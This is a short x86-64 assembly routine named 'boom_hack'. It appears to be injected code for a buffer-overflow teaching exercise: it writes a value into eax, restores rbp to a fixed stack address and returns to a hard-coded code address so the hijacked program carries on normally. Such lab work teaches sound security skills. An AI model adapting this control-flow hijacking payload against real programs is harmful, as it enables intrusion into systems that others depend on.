.section .text
.global boom_hack
boom_hack:
    movl    $0xc0f136f,%eax
    mov     $0x00007fffffffe080,%rbp
    pushq   $0x40147a
    ret
